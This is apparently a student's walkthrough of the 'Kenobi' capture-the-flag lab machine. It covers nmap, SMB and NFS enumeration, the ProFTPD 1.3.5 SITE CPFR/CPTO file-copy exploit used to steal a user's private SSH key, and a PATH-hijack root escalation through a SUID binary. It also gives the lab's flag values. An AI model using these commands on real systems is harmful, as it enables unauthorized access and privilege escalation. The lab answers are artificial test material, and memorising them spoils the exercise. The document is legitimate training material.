# Kenobi

## Task 1 - nmpa Scan

How many ports are open

	nmap -sC -sV -oA nmap/initial 10.10.72.236

## Task 2 - Enumerating Samba for shares

Here is something new SMB enumeration script for nmap

	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.72.236
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 16:49 EST
	Nmap scan report for 10.10.72.236
	Host is up (0.043s latency).

	PORT    STATE SERVICE
	445/tcp open  microsoft-ds

Check out the smb shares

	smbclient //10.10.72.236/anonymous

Here we finde log.txt
Download everything

	smbget -R smb://10.10.72.236/anonymous

-> Examin log.txt

I found information of an ssh key and the configuration of the FTP Server

Further enumeration of open ports with

	nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.72.236 
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-07 17:25 EST
	Nmap scan report for 10.10.72.236
	Host is up (0.042s latency).

	PORT    STATE SERVICE
	111/tcp open  rpcbind
	| nfs-showmount: 
	|_  /var *

	Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds


## Task 3 - Gain initial access with ProFtpd 

Use NC to get the Version Info

	nc 10.10.72.236 21
	220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.72.236]

This version fo ProFTPD is vulnarable to an attack using SITE CPFR and SITE CPTO which lets you copy any file.
We know where the SSH Key of user kenobi is stored so we can copy that to our machine	

	SITE CPFR /home/kenobi/.ssh/id_rsa
	350 File or directory exists, ready for destination name
	SITE CPTO /var/tmp/id_rsa
	250 Copy successful

Mount /var/tmp from the other machine to ours

	mkdir /mnt/kenobiNFS
	mount machine_ip:/var /mnt/kenobiNFS
	ls -la /mnt/kenobiNFS

We can now go to /var/tmp and get the privat ssh key.
Give proper permissions for the key

	sudo chmod 600 id_rsa

use -i with ssh to specify identity file
In kenobis ~/ there is a user.txt with a flag

d0b0f3f53b6caa532a83915e19224899

## Task 4 - Escalate Privileges with PATH Variable Manipulation

Start enumeration by looking for SUID bits

	find / -perm -u=s -type f 2>/dev/null
	/usr/bin/menu

We moved to the tmp directory and created a binary invoking the /bin/sh and named it to curl. 
Then we changed the permission of the binary to be executable. At last, we added this curl into 
the local path using the export command. Now running the menu binary, we choose an option from the 
menu and we got ourselves the root shell. We read the root flag and conclude this machine.
	
	cd /tmp
	echo /bin/sh > curl
	chmod 777 curl
	export PATH=/tmp:$PATH
	/usr/bin/menu

	cat /root/root.txt

177b3cd8562289f37382721c28381f02

----

### Important info:

My IP: 10.9.222.124

Target IP: 10.10.115.154

### Gathered Info

smb usr: guest (READ/WRITE)

usr1: kenobi

----

